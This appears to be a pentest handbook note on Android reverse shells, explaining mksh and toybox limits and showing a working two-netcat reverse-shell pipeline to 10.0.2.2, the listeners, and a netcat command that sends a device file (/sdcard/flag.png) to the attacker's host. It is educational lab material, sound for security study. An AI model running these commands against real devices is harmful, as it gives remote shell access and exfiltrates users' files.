---
title: "Reverse Shells on Android"
slug: reverse-shells-android
category: notes
handbook: mobile
tags: ["android", "shells"]
draft: false
pubDatetime: 2026-09-21T20:10:00+03:00
description: "Reverse shells on Android: mksh has no /dev/tcp, toybox nc has no -e, so sh is piped between two nc connections, with 10.0.2.2 as the emulator's alias for the host."
---

Android's shell is mksh, shipped as `/system/bin/sh`. mksh does not implement `/dev/tcp`, which is a bash feature, so the bash one-liners from [Reverse Shells](/collections/oscp/reverse-shells) never run on an Android device. The core tools (`ls`, `sha1sum`, `nc`) come from toybox, Android's multi-call binary, covered in [Android Foundations](/collections/mobile/android-foundations).

## toybox nc Has No -e

The `-e` flag attaches a program to a socket: everything arriving on the connection is fed to the program as stdin, and the program's output goes back over the connection. busybox `nc KALI 8000 -e sh` uses it to run `sh` over the socket directly. toybox ships `nc` without `-e`, so the shell has to be piped between two `nc` processes by hand:

```text
toybox nc 10.0.2.2 4444 | sh -i 2>&1 | toybox nc 10.0.2.2 4445
```

Reading the pipeline: `sh`'s stdout and stderr pipe into the second `nc`, which sends them to the 4445 listener. The first `nc` prints whatever the 4444 listener sends, and that output feeds `sh` as stdin.

`nc` carries one connection per process, so each direction gets its own listener:

```bash
nc -lvnp 4444
```

```bash
nc -lvnp 4445
```

Type commands into the 4444 terminal, read output from the 4445 terminal.

## The Emulator Address

From inside an emulator, `10.0.2.2` is the host machine. The emulator aliases the host's `127.0.0.1` at that address, so a payload on the device reaches the attacker without knowing a LAN IP. On the host, the connections arrive as `127.0.0.1`, because the emulator NATs them. On a real device over a network, use the attacking machine's LAN IP instead.

## What the Shell Looks Like

A remote `sh -i` over a socket has no terminal on its side. At startup it prints:

```text
sh: can't find tty fd: No such device or address
sh: warning: won't have full job control
```

Job control (background jobs, `Ctrl-Z`) is unavailable, and nothing else is affected. The prompt is the device's hostname and working directory, for example `:/storage/emulated/0 $`. The shell upgrade steps from [Reverse Shells](/collections/oscp/reverse-shells) apply once a terminal multiplexer is on the device.

## Moving a File Through the Shell

A shell built this way owns both connections: one carries commands into `sh`, the other carries output back, and `nc` carries one connection per process. File bytes pushed through either socket would corrupt that stream: the shell would run the file's first bytes as a command, or the output terminal would fill with binary. A transfer opens a third connection instead:

```bash
# host: capture the bytes
nc -lvnp 4446 > flag_received.png
# device shell: send the file
toybox nc 10.0.2.2 4446 < /sdcard/flag.png
```

`< file` feeds the file's bytes to `nc`, which sends them out the connection. Verify the transfer with a checksum on both sides:

```bash
# device
toybox md5sum /sdcard/flag.png
# host
md5sum flag_received.png
```

The transfer shapes and their checks are the same as any netcat move, and [File Transfers](/collections/oscp/file-transfers) covers them in full for Linux and Windows targets.
